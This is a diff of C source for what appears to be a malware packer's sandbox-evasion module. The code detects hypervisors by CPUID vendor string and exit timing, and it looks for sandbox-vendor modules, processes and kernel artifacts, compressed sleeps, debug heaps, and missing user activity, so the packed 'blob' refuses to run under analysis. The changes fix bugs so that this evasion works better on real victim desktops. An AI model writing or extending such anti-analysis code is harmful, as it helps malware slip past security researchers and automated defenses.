@@ -923,6 +923,21 @@ static u32 np_template_name(void) {
 
 /* ---- hypervisor level: CPUID exit cost ----------------------------------- */
 
+/* Windows itself runs on Hyper-V: VBS / Credential Guard, the hypervisor
+ * platform and WSL2 all publish the Microsoft Hv vendor string, and from that
+ * point CPUID traps on what is otherwise bare metal. Detecting that as a
+ * sandbox blocked fully-loaded builds on ordinary Windows 11 desktops, so the
+ * host hypervisor is exempt from the exit-cost score — the same exemption the
+ * vendor layer below already applies to Hyper-V.
+ *
+ * Vendor string "Microsoft Hv" packed little-endian into EBX/ECX/EDX. */
+static u32 np_hv_is_windows_host(void) {
+    u32 c[4] = {0};
+    np_cpuid_leaf(0x40000000u, 0, c);
+    if (c[0] < 0x40000000u) return 0;
+    return (c[1] == 0x7263694Du && c[2] == 0x666F736Fu && c[3] == 0x76482074u) ? 1u : 0u;
+}
+
 /* Every CPUID is a VM exit when the guest is virtualised: ~1000-5000 cycles
  * against ~100-200 on bare metal. A hypervisor configured to hide its vendor
  * string (or to mask ECX[31]) still has to trap the instruction, so timing a
@@ -931,6 +946,7 @@ static u32 np_template_name(void) {
  * The budget is deliberately generous (16 * 400 cycles) so a slow but real
  * machine never trips it, while the cheapest hypervisor exit already does. */
 static u32 np_hv_exit_cost(void) {
+    if (np_hv_is_windows_host()) return 0;
     u32 regs[4];
     np_cpuid_leaf(0, 0, regs);
     u64 t0 = np_rdtsc();
@@ -947,7 +963,7 @@ static u32 np_hv_exit_cost(void) {
  *   - a service key under CurrentControlSet\Services
  *   - a .sys image listed in the kernel module list
  * Each is independent so the detail field says which one fired. */
-static u32 np_kernel_artifacts(u32* det) {
+static u32 np_kernel_artifacts(u64* det) {
     u32 hits = 0;
 
     /* Fixed-width matrices, not pointer tables: the blob is deployed at an
@@ -1090,9 +1106,9 @@ static void np_dbg_line(const char* s) {
     ch(h);
 }
 
-static void np_dbg_hex32(char* p, u32 v) {
+static void np_dbg_hex64(char* p, u64 v) {
     static const char hx[] = "0123456789ABCDEF";
-    for (int i = 7; i >= 0; i--) p[7 - i] = hx[(v >> (i * 4)) & 0xF];
+    for (int i = 15; i >= 0; i--) p[15 - i] = hx[(v >> (i * 4)) & 0xF];
 }
 
 static void np_dbg_report(u32 score, u64 detail, u32 threshold) {
@@ -1116,8 +1132,8 @@ static void np_dbg_report(u32 score, u64 detail, u32 threshold) {
     while (d--) line[n++] = dec[d];
     static const char dtag[] = " detail=0x";
     for (u32 i = 0; dtag[i]; i++) line[n++] = dtag[i];
-    np_dbg_hex32(line + n, detail);
-    n += 8;
+    np_dbg_hex64(line + n, detail);
+    n += 16;
     line[n++] = '\n';
     line[n] = 0;
     np_dbg_line(line);
@@ -4986,7 +5002,7 @@ static u32 np_vendor_name_hit(void) {
  * These are strong signals on their own: a real customer machine never loads
  * a module, runs a process, or carries a registry key named after the
  * sandbox vendor. */
-static u32 np_vendor_score(u32* det) {
+static u32 np_vendor_score(u64* det) {
     u32 score = 0;
     if (np_vendor_module_hit())   { score += 30; *det |= NP_SB_MS_MOD;  }
     if (np_vendor_process_hit())  { score += 30; *det |= NP_SB_MS_PROC; }
@@ -5211,7 +5227,7 @@ static u32 np_analy_creation_burst(void) {
 }
 
 /* Score contribution of the behavioural layer. */
-static u32 np_analy_score(u32* det) {
+static u32 np_analy_score(u64* det) {
     u32 score = 0;
     if (np_analy_sleep_compressed())      { score += 28; *det |= NP_SB_AN_SLEEP; }
     if (np_analy_debug_heap())            { score += 26; *det |= NP_SB_AN_HFLAG; }
@@ -5396,7 +5412,10 @@ static u32 np_gate_kernel = 0;
 
 static u32 np_sandbox_score_ex(u64* detail) {
     u32 score = 0;
-    u32 det = 0;
+    /* u64: the analysis-artefact, hypervisor-exit and kernel-artefact signals
+     * live above bit 31, so a u32 accumulator silently drops them — they then
+     * count towards the score but can never satisfy the NP_SB_STRONG gate. */
+    u64 det = 0;
 
     /* 1. hypervisor vendor bits via CPUID 0x40000000 (Hyper-V exempt) */
     u32 c[4] = {0};
@@ -5416,7 +5435,7 @@ static u32 np_sandbox_score_ex(u64* detail) {
     /* 1c. driver level: kernel artifacts the sandbox cannot hide with its agent
      * process -- device object, driver service, loaded .sys image. */
     if (np_gate_kernel) {
-        u32 kdet = 0;
+        u64 kdet = 0;
         const u32 khits = np_kernel_artifacts(&kdet);
         if (khits) {
             score += 18u * (khits > 2 ? 2u : khits);
@@ -5682,11 +5701,15 @@ static u32 np_chk_pe_header(void* base) {
  * boundary machine or a 768p laptop was rejected even with a real user
  * sitting in front of it - a false-positive factory.
  *
- * New design: a real interactive desktop short-circuits the check entirely.
- * "Interactive" means user input within the last 15 minutes OR a visible
- * shell taskbar. Only a genuinely headless environment is scored, and each
- * missing minimum contributes a small weight; the pack-time threshold at
- * +124 decides. Every probe degrades to "pass" when its API is unavailable.
+ * New design: the heuristic signals (no taskbar, no input since boot) are only
+ * scored in a headless environment, where they are the only evidence there is.
+ * Every probe degrades to "pass" when its API is unavailable.
+ *
+ * The pack-time minimums are deliberately NOT gated on interactivity: the
+ * client UI presents them as a promise ("reject a machine below this"), so an
+ * operator who sets min-cpu=4 means 4 and not "4 unless someone is moving the
+ * mouse". Leaving every minimum at 0 keeps the plain heuristic behaviour,
+ * because the score then comes from the headless signals alone.
  * ======================================================================== */
 
 static u32 np_chk_env(const u8* b) {
@@ -5742,21 +5765,26 @@ static u32 np_chk_env(const u8* b) {
         }
     }
 
-    /* ---- a real desktop short-circuits everything ---- */
+    /* ---- a real desktop suppresses the heuristic signals ---- */
     u32 interactive = ((idle_ms != 0xFFFFFFFFu && idle_ms < 900000ull) || taskbar) ? 1u : 0u;
-    if (interactive) return 0;
 
-    /* ---- headless: score the missing minimums ---- */
+    /* ---- explicit minimums: scored wherever they are set ---- */
     u32 score = 0;
     if (min_cpu && cpu && cpu < min_cpu) score += 3;
     if (min_ram_mb && ram_bytes && ram_bytes < (u64)min_ram_mb * 1048576ull) score += 3;
-    if (min_uptime && uptime_ms < (u64)min_uptime) score += 3;
+    /* uptime_ms stays 0 when GetTickCount64 is missing, and 0 < min_uptime would
+     * then score a missing API as a hit. Guard it like every other probe. */
+    if (min_uptime && uptime_ms && uptime_ms < (u64)min_uptime) score += 3;
     if (min_w && w && w < (int)min_w) score += 3;
     if (min_h && h && h < (int)min_h) score += 3;
     if (min_mon && mon && mon < (int)min_mon) score += 3;
-    if (!taskbar) score += 3;
-    if (uptime_ms > 300000ull && idle_ms != 0xFFFFFFFFu &&
-        (u64)idle_ms >= uptime_ms - 5000ull) score += 3;   /* no input since boot */
+
+    /* ---- headless: these are the only evidence available ---- */
+    if (!interactive) {
+        if (!taskbar) score += 3;
+        if (uptime_ms > 300000ull && idle_ms != 0xFFFFFFFFu &&
+            (u64)idle_ms >= uptime_ms - 5000ull) score += 3;   /* no input since boot */
+    }
 
     return (score >= threshold) ? 1u : 0u;
 }
